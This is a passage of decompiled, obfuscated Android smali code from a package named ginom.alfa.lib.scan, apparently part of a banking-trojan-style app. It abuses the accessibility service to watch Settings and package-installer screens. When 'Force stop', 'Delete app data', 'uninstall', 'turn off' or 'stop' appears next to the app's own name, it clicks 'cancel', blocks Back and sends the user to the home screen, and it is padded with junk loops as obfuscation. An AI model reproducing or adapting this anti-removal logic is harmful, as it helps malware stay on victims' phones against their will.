    const/high16 v4, 0x10000000

    .line 1032
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x40000000    # 2.0f

    .line 1033
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v3

    .line 1031
    invoke-virtual {v0, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->startActivity(Landroid/content/Intent;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_8

    return-void

    .line 1043
    :cond_2b
    :try_start_e
    sput-boolean v15, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112CheckPrims:Z

    .line 1048
    :catch_8
    :cond_2c
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112bypass:Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-nez v3, :cond_59

    invoke-static {}, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->NOKILL()Z

    move-result v3

    if-eqz v3, :cond_59

    .line 1052
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "["

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "]"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 1053
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    .line 1054
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0xf

    if-le v5, v8, :cond_59

    .line 1056
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    const-string v8, "com.android.settings.SubSettings"

    .line 1057
    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v8

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_37

    .line 1058
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v8, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_2d

    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_37

    .line 1061
    :cond_2d
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1062
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    .line 1063
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 1064
    :cond_2e
    :goto_15
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_2f

    .line 1066
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1067
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2e

    .line 1069
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_15

    .line 1074
    :cond_2f
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 1075
    :cond_30
    :goto_16
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_31

    .line 1077
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1078
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_30

    .line 1080
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_16

    .line 1084
    :cond_31
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 1085
    :cond_32
    :goto_17
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_33

    .line 1087
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1088
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_32

    .line 1090
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_17

    .line 1095
    :cond_33
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 1096
    :cond_34
    :goto_18
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_35

    .line 1098
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1099
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_34

    .line 1101
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_18

    .line 1105
    :cond_35
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 1106
    :cond_36
    :goto_19
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_37

    .line 1108
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1109
    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_36

    .line 1111
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_19

    .line 1122
    :cond_37
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    .line 1125
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    .line 1126
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v8

    .line 1129
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_38

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_39

    :cond_38
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v8, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3a

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3a

    .line 1131
    :cond_39
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1132
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    :cond_3a
    const-string v2, "Force stop"

    .line 1137
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_9

    const-string v8, "cancel"

    if-nez v2, :cond_3b

    :try_start_f
    const-string v2, "Delete app data"

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3c

    .line 1139
    :cond_3b
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    .line 1140
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1141
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    .line 1145
    :cond_3c
    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3d

    const-string v2, "uninstall"

    .line 1146
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_3e

    .line 1147
    :cond_3d
    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3f

    const-string v2, "turn off"

    .line 1148
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3f

    .line 1150
    :cond_3e
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    .line 1151
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1152
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    :cond_3f
    const-string v2, "Phone options"

    .line 1156
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_40

    .line 1158
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1159
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    :cond_40
    const-string v2, "\u0625\u064a\u0642\u0627\u0641"

    .line 1164
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_41

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_42

    :cond_41
    const-string v2, "stop"

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4c

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4c

    .line 1166
    :cond_42
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    .line 1167
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1168
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    .line 1169
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1170
    :cond_43
    :goto_1a
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_44

    .line 1172
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1173
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_43

    .line 1175
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1a

    .line 1180
    :cond_44
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1181
    :cond_45
    :goto_1b
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_46

    .line 1183
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1184
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_45

    .line 1186
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1b

    .line 1190
    :cond_46
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1191
    :cond_47
    :goto_1c
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_48

    .line 1193
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1194
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_47

    .line 1196
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1c

    .line 1201
    :cond_48
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1202
    :cond_49
    :goto_1d
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_4a

    .line 1204
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1205
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_49

    .line 1207
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1d

    .line 1211
    :cond_4a
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1212
    :cond_4b
    :goto_1e
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_4c

    .line 1214
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1215
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4b

    .line 1217
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1e

    .line 1225
    :cond_4c
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "com.google.android.packageinstaller"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_56

    .line 1226
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    const-string v3, "android.app.alertdialog"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_56

    .line 1227
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_56

    .line 1231
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    .line 1232
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V

    .line 1233
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendMeHome()V

    .line 1234
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1235
    :cond_4d
    :goto_1f
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_4e

    .line 1237
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1238
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4d

    .line 1240
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1f

    .line 1245
    :cond_4e
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1246
    :cond_4f
    :goto_20
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_50

    .line 1248
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1249
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4f

    .line 1251
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_20

    .line 1255
    :cond_50
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1256
    :cond_51
    :goto_21
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_52

    .line 1258
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1259
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_51

    .line 1261
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_21

    .line 1266
    :cond_52
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1267
    :cond_53
    :goto_22
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_54

    .line 1269
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1270
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_53

    .line 1272
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_22

    .line 1276
    :cond_54
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1277
    :cond_55
    :goto_23
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_56

    .line 1279
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1280
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_55

    .line 1282
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_23

    :cond_56
    const-string v2, "android.support.v7.widget.recyclerview"

    .line 1289
    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_57

    const-string v2, "android.widget.linearlayout"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

